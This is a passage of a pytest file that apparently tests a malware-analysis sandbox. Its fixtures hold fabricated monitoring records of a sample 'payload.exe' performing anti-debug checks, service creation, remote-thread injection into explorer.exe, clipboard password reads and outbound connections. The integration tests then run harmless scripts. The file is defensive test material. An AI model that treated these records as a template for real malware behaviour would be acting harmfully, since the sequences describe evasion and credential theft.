    ]


@pytest.fixture
def sample_api_calls() -> list[ApiCall]:
    """Provide sample API calls including anti-debug and sleep.

    Returns:
        list[ApiCall]: Three API call entries.
    """
    return [
        ApiCall(
            timestamp=ts_offset(3),
            process_name="payload.exe",
            pid=500,
            api_name="IsDebuggerPresent",
            module="kernel32.dll",
            arguments=[],
            return_value="0",
        ),
        ApiCall(
            timestamp=ts_offset(4),
            process_name="payload.exe",
            pid=500,
            api_name="Sleep",
            module="kernel32.dll",
            arguments=["120000"],
            return_value="0",
        ),
        ApiCall(
            timestamp=ts_offset(5),
            process_name="payload.exe",
            pid=500,
            api_name="CreateFileW",
            module="kernel32.dll",
            arguments=["C:\\Temp\\output.dat", "GENERIC_WRITE"],
            return_value="0x100",
        ),
    ]


@pytest.fixture
def sample_service_changes() -> list[ServiceChange]:
    """Provide sample service changes.

    Returns:
        list[ServiceChange]: One service change entry.
    """
    return [
        ServiceChange(
            service_name="MalSvc",
            display_name="Malicious Service",
            binary_path="C:\\Temp\\payload.exe",
            start_type="auto",
            operation="created",
            timestamp=ts_offset(6),
        ),
    ]


@pytest.fixture
def sample_injection_events() -> list[InjectionEvent]:
    """Provide sample injection events.

    Returns:
        list[InjectionEvent]: One injection event entry.
    """
    return [
        InjectionEvent(
            timestamp=ts_offset(7),
            source_pid=500,
            source_name="payload.exe",
            target_pid=1234,
            target_name="explorer.exe",
            injection_type="CreateRemoteThread",
            api_calls=["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"],
        ),
    ]


@pytest.fixture
def sample_clipboard_events() -> list[ClipboardEvent]:
    """Provide sample clipboard events.

    Returns:
        list[ClipboardEvent]: Two clipboard events (read and write).
    """
    return [
        ClipboardEvent(
            timestamp=ts_offset(8),
            operation="read",
            format="CF_TEXT",
            content_preview="password123",
            size_bytes=_SAMPLE_CLIPBOARD_SIZE,
            pid=500,
            process_name="payload.exe",
        ),
        ClipboardEvent(
            timestamp=ts_offset(9),
            operation="write",
            format="CF_TEXT",
            content_preview="replaced",
            size_bytes=8,
            pid=500,
            process_name="payload.exe",
        ),
    ]


@pytest.fixture
def sample_dll_loads() -> list[DllLoadEvent]:
    """Provide sample DLL load events.

    Returns:
        list[DllLoadEvent]: One DLL load entry.
    """
    return [
        DllLoadEvent(
            timestamp=ts_offset(2),
            pid=500,
            process_name="payload.exe",
            dll_path="C:\\Windows\\System32\\kernel32.dll",
            base_address="0x7FFE0000",
            size=_SAMPLE_DLL_SIZE,
            event_id=_DLL_IMAGE_LOAD_EVENT_ID,
            payload_schema="",
        ),
    ]


@pytest.fixture
def sample_kernel_objects() -> list[KernelObjectActivity]:
    """Provide sample kernel object activity.

    Returns:
        list[KernelObjectActivity]: One kernel object entry.
    """
    return [
        KernelObjectActivity(
            object_type="Mutex",
            name="Global\\MalwareMutex",
            pid=500,
            process_name="payload.exe",
            operation="created",
            timestamp=ts_offset(3),
        ),
    ]


@pytest.fixture
def sample_resource_samples() -> list[ResourceSample]:
    """Provide sample resource usage data.

    Returns:
        list[ResourceSample]: One resource sample entry.
    """
    return [
        ResourceSample(
            timestamp=ts_offset(5),
            cpu_percent=45.2,
            memory_mb=128.0,
            disk_read_bytes=1024,
            disk_write_bytes=2048,
            net_sent_bytes=256,
            net_recv_bytes=512,
        ),
    ]


@pytest.fixture
def sample_report(
    sample_network_activity: list[NetworkActivity],
    sample_file_changes: list[FileChange],
    sample_registry_changes: list[RegistryChange],
    sample_process_activity: list[ProcessActivity],
    sample_api_calls: list[ApiCall],
    sample_service_changes: list[ServiceChange],
    sample_injection_events: list[InjectionEvent],
    sample_clipboard_events: list[ClipboardEvent],
    sample_dll_loads: list[DllLoadEvent],
    sample_kernel_objects: list[KernelObjectActivity],
    sample_resource_samples: list[ResourceSample],
) -> ExecutionReport:
    """Provide a full ExecutionReport combining all sample fixtures.

    Args:
        sample_network_activity: Network activity data.
        sample_file_changes: File change data.
        sample_registry_changes: Registry change data.
        sample_process_activity: Process activity data.
        sample_api_calls: API call data.
        sample_service_changes: Service change data.
        sample_injection_events: Injection event data.
        sample_clipboard_events: Clipboard event data.
        sample_dll_loads: DLL load event data.
        sample_kernel_objects: Kernel object data.
        sample_resource_samples: Resource sample data.

    Returns:
        ExecutionReport: Full report with all monitoring data.
    """
    return make_sample_report(
        network_activity=sample_network_activity,
        file_changes=sample_file_changes,
        registry_changes=sample_registry_changes,
        process_activity=sample_process_activity,
        api_calls=sample_api_calls,
        service_changes=sample_service_changes,
        injection_events=sample_injection_events,
        clipboard_events=sample_clipboard_events,
        dll_loads=sample_dll_loads,
        kernel_objects=sample_kernel_objects,
        resource_samples=sample_resource_samples,
    )


@pytest.fixture
def empty_report() -> ExecutionReport:
    """Provide a minimal report with all lists empty.

    Returns:
        ExecutionReport: Report with no monitoring data.
    """
    return make_sample_report()


@pytest.fixture
def sandbox_bridge() -> SandboxBridge:
    """Provide a SandboxBridge with pre-populated windows and qemu instances.

    Both instances have ``last_report`` set with sample monitoring data.

    Returns:
        SandboxBridge: Configured bridge ready for testing.
    """
    bridge = SandboxBridge()

    win_sandbox = InMemorySandbox()
    win_sandbox.state.status = "running"
    win_inst = StubInstance(win_sandbox, "windows", instance_id="win-test-001")
    win_inst.last_report = ExecutionReport(
        result="success",
        exit_code=0,
        stdout="ok",
        stderr="",
        duration_seconds=2.0,
        file_changes=[
            FileChange(
                path="C:\\out.txt",
                operation="created",
                old_path=None,
                timestamp=ts_offset(1),
                size=100,
            ),
        ],
        network_activity=[
            NetworkActivity(
                protocol="tcp",
                direction="outbound",
                local_address="192.168.1.100",
                local_port=49152,
                remote_address="185.220.101.45",
                remote_port=443,
                timestamp=ts_offset(2),
                bytes_sent=256,
                bytes_received=512,
            ),
        ],
    )

    qemu_sandbox = InMemoryQEMUSandbox()
    qemu_sandbox.state.status = "running"
    qemu_inst = StubInstance(qemu_sandbox, "qemu", instance_id="qemu-test-001")
    qemu_inst.last_report = ExecutionReport(
        result="success",
        exit_code=0,
        stdout="ok",
        stderr="",
        duration_seconds=3.0,
    )

    manager = StubManager({
        "win-test-001": win_inst,
        "qemu-test-001": qemu_inst,
    })

    bridge.attach_manager(cast("SandboxManager", manager))
    return bridge


@pytest.fixture
def bridge_no_reports() -> SandboxBridge:
    """Provide a SandboxBridge with instances but no last_report.

    Returns:
        SandboxBridge: Bridge with instances lacking execution reports.
    """
    bridge = SandboxBridge()

    win_sandbox = InMemorySandbox()
    win_sandbox.state.status = "running"
    win_inst = StubInstance(win_sandbox, "windows", instance_id="win-noreport-001")

    qemu_sandbox = InMemoryQEMUSandbox()
    qemu_sandbox.state.status = "running"
    qemu_inst = StubInstance(qemu_sandbox, "qemu", instance_id="qemu-noreport-001")

    manager = StubManager({
        "win-noreport-001": win_inst,
        "qemu-noreport-001": qemu_inst,
    })

    bridge.attach_manager(cast("SandboxManager", manager))
    return bridge


@pytest.mark.integration
@pytest.mark.spawns_process
def test_local_process_sandbox_reports_real_execution(local_process_sandbox: LocalProcessSandbox) -> None:
    """The real sandbox captures genuinely observed exit code, output, and file changes.

    This is the gate for the audit finding that sandbox tests only ran against the
    fabricated :class:`InMemorySandbox`. Here the *real* :class:`LocalProcessSandbox`
    launches the current Python interpreter as a genuine OS subprocess. The program
    prints a deterministic marker to stdout and stderr and creates one real file in
    the sandbox work directory. The returned :class:`ExecutionReport` is then asserted
    field-by-field against the independently-known behaviour of that program:

    * ``exit_code`` is exactly ``0`` (the program calls ``raise SystemExit(0)`` implicitly).
    * ``stdout``/``stderr`` contain the exact emitted markers.
    * ``file_changes`` reflects the single created file, observed by the real
      before/after directory diff, with the exact relative path, ``created``
      operation, and the exact byte size the program wrote.

    Because every asserted value comes from real subprocess execution and a real
    file-system diff (not fabricated data), corrupting ``run_binary``'s capture or
    diff logic makes the test fail.

    Args:
        local_process_sandbox: A started real local-process sandbox.
    """
    payload = b"sandbox-artifact-bytes"
    program = (
        f"import sys\nsys.stdout.write('STDOUT-MARKER')\nsys.stderr.write('STDERR-MARKER')\nopen('artifact.bin', 'wb').write({payload!r})\n"
    )
    script = local_process_sandbox.workdir / "prog.py"
    script.write_text(program, encoding="utf-8")

    loop = asyncio.get_event_loop()
    report: ExecutionReport = loop.run_until_complete(
        local_process_sandbox.run_binary(Path(sys.executable), args=[str(script)], time_limit=60),
    )

    assert report.result == "success"
    assert report.exit_code == 0
    assert report.stdout == "STDOUT-MARKER"
    assert report.stderr == "STDERR-MARKER"
    assert report.duration_seconds > 0.0

    created = [fc for fc in report.file_changes if fc["operation"] == "created"]
    artifact = next((fc for fc in created if fc["path"] == "artifact.bin"), None)
    assert artifact is not None, f"real diff must observe the created artifact, got {[fc['path'] for fc in report.file_changes]}"
    assert artifact["size"] == len(payload)
    assert (local_process_sandbox.workdir / "artifact.bin").read_bytes() == payload


@pytest.mark.integration
@pytest.mark.spawns_process
def test_local_process_sandbox_run_binary_times_out(local_process_sandbox: LocalProcessSandbox) -> None:
    """A genuinely long-running subprocess is killed and surfaced as ``SandboxError``.

    The real interpreter is told to sleep far longer than the ``time_limit``. The
    sandbox must enforce the real timeout, kill the live process, and raise the
    specific :class:`SandboxError` (not swallow the failure or hang). This exercises
    the real error path of the real backend.

    Args:
        local_process_sandbox: A started real local-process sandbox.
    """
    loop = asyncio.get_event_loop()
    with pytest.raises(SandboxError, match="timed out"):
        loop.run_until_complete(
            local_process_sandbox.run_binary(Path(sys.executable), args=["-c", "import time; time.sleep(30)"], time_limit=1),
        )


@pytest.mark.integration
@pytest.mark.spawns_process
def test_local_process_sandbox_copy_from_missing_file_raises(local_process_sandbox: LocalProcessSandbox) -> None:
    """Exporting a file that the real sandbox never produced raises ``SandboxError``.

    Args:
        local_process_sandbox: A started real local-process sandbox.
    """
    loop = asyncio.get_event_loop()
    with pytest.raises(SandboxError, match="file not found in sandbox"):
        loop.run_until_complete(
            local_process_sandbox.copy_from_sandbox("does-not-exist.bin", _TMPDIR / "out.bin"),
        )
